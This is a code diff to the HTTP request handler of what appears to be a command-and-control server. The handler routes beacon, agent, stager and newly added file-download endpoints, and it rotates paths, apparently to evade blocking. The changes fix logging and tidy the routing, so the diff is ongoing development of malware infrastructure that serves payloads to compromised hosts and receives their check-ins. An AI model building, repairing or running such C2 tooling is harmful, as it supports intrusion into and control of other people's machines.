@@ -82,9 +82,17 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         # Create path router using the path manager
         self.path_router = PathRouter(path_manager)
 
-    def log_message(self, format, *args):
-        """Override to use external logger"""
-        self.external_logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")
+    def log_message(self, format_str, *args):
+        """Override to use external logger - fixed to handle f-strings properly"""
+        # Instead of using % formatting, we'll just pass the formatted string directly
+        if args:
+            # If traditional args are provided, use standard formatting
+            message = format_str % args
+        else:
+            # Otherwise, assume format_str is already formatted (e.g., from an f-string)
+            message = format_str
+            
+        self.external_logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {message}")
 
     def do_GET(self):
         """Route GET requests to appropriate handlers"""
@@ -93,20 +101,23 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             self.external_logger(f"Paths rotated during request handling")
 
         # Log the request
-        self.log_message(f"Received GET request for {self.path}")
+        self.log_message("Received GET request for %s", self.path)
+
+        # Extract base path without query string for routing
+        base_path = self.path.split('?')[0] if '?' in self.path else self.path
 
         # Check which endpoint this path maps to
-        endpoint_type = self.path_router.get_endpoint_type(self.path)
+        endpoint_type = self.path_router.get_endpoint_type(base_path)
         
         # Route to appropriate handler based on endpoint type
-        if endpoint_type == "beacon_path" or endpoint_type == "previous_beacon_path":
-            self._handle_beacon()
-        elif endpoint_type == "old_beacon_path":
-            self._handle_beacon(include_rotation_info=True)
-        elif endpoint_type == "agent_path" or endpoint_type == "previous_agent_path" or endpoint_type == "old_agent_path":
+        if endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path"]:
+            self._handle_beacon(include_rotation_info=(endpoint_type == "old_beacon_path"))
+        elif endpoint_type in ["agent_path", "previous_agent_path", "old_agent_path"]:
             self._handle_agent()
-        elif endpoint_type == "stager_path" or endpoint_type == "previous_stager_path" or endpoint_type == "old_stager_path":
+        elif endpoint_type in ["stager_path", "previous_stager_path", "old_stager_path"]:
             self._handle_stager()
+        elif endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
+            self._handle_file_download()
         else:
             self._handle_default()
     
@@ -117,7 +128,7 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             self.external_logger(f"Paths rotated during request handling")
         
         # Log the request
-        self.log_message(f"Received POST request for {self.path}")
+        self.log_message("Received POST request for %s", self.path)
 
         # Check which endpoint this path maps to
         endpoint_type = self.path_router.get_endpoint_type(self.path)
